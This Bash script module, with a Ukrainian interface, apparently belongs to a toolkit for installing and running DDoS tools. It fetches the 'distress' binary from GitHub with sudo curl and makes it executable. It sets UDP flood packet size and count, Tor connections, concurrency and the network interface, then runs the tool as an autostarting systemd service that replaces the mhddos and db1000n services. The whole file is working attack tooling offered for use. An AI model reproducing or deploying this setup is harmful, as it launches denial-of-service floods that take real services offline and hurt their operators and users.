#!/bin/bash

install_distress() {
    adss_dialog "$(trans "Встановлюємо DISTRESS")"

    install() {
        cd $TOOL_DIR
        OSARCH=$(uname -m)
        package=''
        case "$OSARCH" in
          aarch64*)
            package=https://github.com/Yneth/distress-releases/releases/latest/download/distress_aarch64-unknown-linux-musl
          ;;

          x86_64*)
            package=https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl
          ;;

          i386* | i686*)
            package=https://github.com/Yneth/distress-releases/releases/latest/download/distress_i686-unknown-linux-musl
          ;;

          *)
            confirm_dialog "$(trans "Неможливо визначити розрядность операційної системи")"
            ddos_tool_managment
          ;;
        esac

        sudo curl -Lo distress "$package"
        sudo chmod +x distress
        regenerate_distress_service_file
        create_symlink
    }
    install > /dev/null 2>&1
    confirm_dialog "$(trans "DISTRESS успішно встановлено")"
}

configure_distress() {
    clear
    declare -A params;

    echo -e "${GRAY}$(trans "Залишіть пустим якщо бажаєте видалити пераметри")${NC}"
    read -e -p "$(trans "Юзер ІД: ")" -i "$(get_distress_variable 'user-id')" user_id

    params[user-id]=$user_id

    read -e -p "$(trans "Відсоткове співвідношення використання власної IP адреси (0-100): ")" -i "$(get_distress_variable 'use-my-ip')" use_my_ip
    if [[ -n "$use_my_ip" ]];then
      while [[ $use_my_ip -lt 0 || $use_my_ip -gt 100 ]]
      do
        echo "$(trans "Будь ласка введіть правильні значення")"
        read -e -p "$(trans "Відсоткове співвідношення використання власної IP адреси (0-100): ")" -i "$(get_distress_variable 'use-my-ip')" use_my_ip
      done
    fi

    params[use-my-ip]=$use_my_ip

    if [[ $use_my_ip > 0 ]]; then
      read -e -p "$(trans "Увімкнути UDP flood (1 | 0): ")" -i "$(get_distress_variable 'direct-udp-mixed-flood')" direct_udp_failover
      if [[ -n "$direct_udp_failover" ]];then
        while [[ "$direct_udp_failover" != "1" && "$direct_udp_failover" != "0" ]]
        do
          echo "$(trans "Будь ласка введіть правильні значення")"
          read -e -p "$(trans "Увімкнути UDP flood (1 | 0): ")" -i "$(get_distress_variable 'direct-udp-mixed-flood')" direct_udp_failover
        done
      fi

      params[direct-udp-mixed-flood]=$direct_udp_failover

      if [[ $direct_udp_failover > 0 ]]; then

        packageSize="$(get_distress_variable 'udp-packet-size')"
        if [[ -z $packageSize || $packageSize == " "  ]];then
          packageSize=4096
        fi

        read -e -p "$(trans "Розмір UDP пакунку: ")" -i "$packageSize" udp_packet_size
        if [[ -n "$udp_packet_size" ]];then
          while [[ ! $udp_packet_size =~ ^[0-9]+$ ]]
          do
            echo "$(trans "Будь ласка введіть правильні значення")"
            read -e -p "$(trans "Розмір UDP пакунку: ")" -i "$packageSize" udp_packet_size
          done
        fi

        params[udp-packet-size]=$udp_packet_size

        connCount="$(get_distress_variable 'direct-udp-mixed-flood-packets-per-conn')"
        if [[ -z $connCount || $connCount == " " ]];then
          connCount=30
        fi

        read -e -p "$(trans "Кількість пакетів: ")" -i $connCount direct_udp_mixed_flood_packets_per_conn
        if [[ -n "$direct_udp_mixed_flood_packets_per_conn" ]];then
          while [[ ! $direct_udp_mixed_flood_packets_per_conn =~ ^[0-9]+$ ]]
          do
            echo "$(trans "Будь ласка введіть правильні значення")"
            read -e -p "$(trans "Кількість пакетів: ")" -i $connCount direct_udp_mixed_flood_packets_per_conn
          done
        fi

        params[direct-udp-mixed-flood-packets-per-conn]=$direct_udp_mixed_flood_packets_per_conn

      else
        params[direct-udp-mixed-flood-packets-per-conn]=" "
        params[udp-packet-size]=" "
      fi

    else
      params[direct-udp-mixed-flood]=" "
      params[direct-udp-mixed-flood-packets-per-conn]=" "
      params[udp-packet-size]=" "
    fi


    read -e -p "$(trans "Кількість підключень Tor (0-100): ")"  -i "$(get_distress_variable 'use-tor')" use_tor
    if [[ -n "$use_tor" ]];then
      while [[ $use_tor -lt 0 || $use_tor -gt 100 ]]
      do
        echo "$(trans "Будь ласка введіть правильні значення")"
        read -e -p "$(trans "Кількість підключень Tor (0-100): ")" -i "$(get_distress_variable 'use-tor')" use_tor
      done
    fi

    params[use-tor]=$use_tor

    read -e -p "$(trans "Кількість створювачів завдань (4096): ")"  -i "$(get_distress_variable 'concurrency')" concurrency
    if [[ -n "$concurrency" ]];then
      while [[ ! $concurrency =~ ^[0-9]+$ ]]
      do
        echo "$(trans "Будь ласка введіть правильні значення")"
        read -e -p "$(trans "Кількість створювачів завдань (4096): ")" -i "$(get_distress_variable 'concurrency')" concurrency
      done
    fi

    params[concurrency]=$concurrency

    echo -ne "\n"
    echo -e "${ORANGE}$(trans "Назва інтерфейсу (ensXXX, ethX, тощо.)")${NC}"
    read -e -p "$(trans "Інтерфейс: ")"  -i "$(get_distress_variable 'interface')" interface
    if [[ -n "$interface" ]];then
      params[interface]=$interface
    else
      params[interface]=" "
    fi

    for i in "${!params[@]}"; do
    	  value="${params[$i]}"
    	  write_distress_variable "$i" "$value"
    done
    regenerate_distress_service_file
    if systemctl is-active --quiet distress.service; then
        sudo rm -rf /tmp/distress >/dev/null 2>&1
        sudo systemctl restart distress.service >/dev/null 2>&1
    fi
    confirm_dialog "$(trans "Успішно виконано")"
}

get_distress_variable() {
  lines=$(sed -n "/\[distress\]/,/\[\/distress\]/p" "${SCRIPT_DIR}"/services/EnvironmentFile)
  variable=$(echo "$lines" | grep "$1=" | cut -d '=' -f2)
  echo "$variable"
}

write_distress_variable() {
  sed -i "/\[distress\]/,/\[\/distress\]/s/$1=.*/$1=$2/g" "${SCRIPT_DIR}"/services/EnvironmentFile
}

regenerate_distress_service_file() {
  lines=$(sed -n "/\[distress\]/,/\[\/distress\]/p" "${SCRIPT_DIR}"/services/EnvironmentFile)

  start="ExecStart=/opt/itarmy/bin/distress"

  while read -r line
  do
    key=$(echo "$line"  | cut -d '=' -f1)
    value=$(echo "$line" | cut -d '=' -f2)

    if [[ "$key" = "[distress]" || "$key" = "[/distress]" ]]; then
      continue
    fi
    if [[ "$key" == 'direct-udp-mixed-flood' ]];then
      if [[ "$value" == 0 ]]; then
        continue
      elif [[ "$value" == 1 ]]; then
        value=" "
      fi
    fi
    if [[ "$value" ]]; then
      start="$start --$key $value"
    fi
  done <<< "$lines"
  start=$(echo $start  | sed 's/\//\\\//g')

  sed -i  "s/ExecStart=.*/$start/g" "${SCRIPT_DIR}"/services/distress.service

  sudo systemctl daemon-reload
}

distress_run() {
  sudo rm -rf /tmp/distress >/dev/null 2>&1
  sudo systemctl stop mhddos.service >/dev/null 2>&1
  sudo systemctl stop db1000n.service >/dev/null 2>&1
  sudo systemctl start distress.service >/dev/null 2>&1
}

distress_auto_enable() {
  sudo systemctl disable mhddos.service >/dev/null 2>&1
  sudo systemctl disable db1000n.service >/dev/null 2>&1
  sudo systemctl enable distress >/dev/null 2>&1
  create_symlink
  confirm_dialog "$(trans "DISTRESS додано до автозавантаження")"
}

distress_auto_disable() {
  sudo systemctl disable distress >/dev/null 2>&1
  create_symlink
  confirm_dialog "$(trans "DISTRESS видалено з автозавантаження")"
}

distress_enabled() {
  if sudo systemctl is-enabled distress >/dev/null 2>&1; then
    return 0
  else
    return 1
  fi
}

distress_stop() {
  sudo systemctl stop distress.service >/dev/null 2>&1
}

distress_get_status() {
  clear
  sudo systemctl status distress.service
  echo -e "${ORANGE}$(trans "Нажміть будь яку клавішу щоб продовжити")${NC}"
  read -s -n 1 key
  initiate_distress
}

distress_installed() {
  if [[ ! -f "$TOOL_DIR/distress" ]]; then
      confirm_dialog "$(trans "DISTRESS не встановлений, будь ласка встановіть і спробуйте знову")"
      return 1
  else
      return 0
  fi
}

initiate_distress() {
   distress_installed
   if [[ $? == 1 ]]; then
    ddos_tool_managment
  else
      if sudo systemctl is-active distress >/dev/null 2>&1; then
        active_disactive="$(trans "Зупинка DISTRESS")"
      else
        active_disactive="$(trans "Запуск DISTRESS")"
      fi
      menu_items=("$active_disactive" "$(trans "Налаштування DISTRESS")" "$(trans "Статус DISTRESS")" "$(trans "Повернутись назад")")
      display_menu "DISTRESS" "${menu_items[@]}"

      case $? in
        1)
          if sudo systemctl is-active distress >/dev/null 2>&1; then
             distress_stop
             distress_get_status
          else
            distress_run
            distress_get_status
          fi
        ;;
        2)
          configure_distress
          initiate_distress
        ;;
        3)
          distress_get_status
        ;;
        4)
          ddos_tool_managment
        ;;
      esac
  fi
}
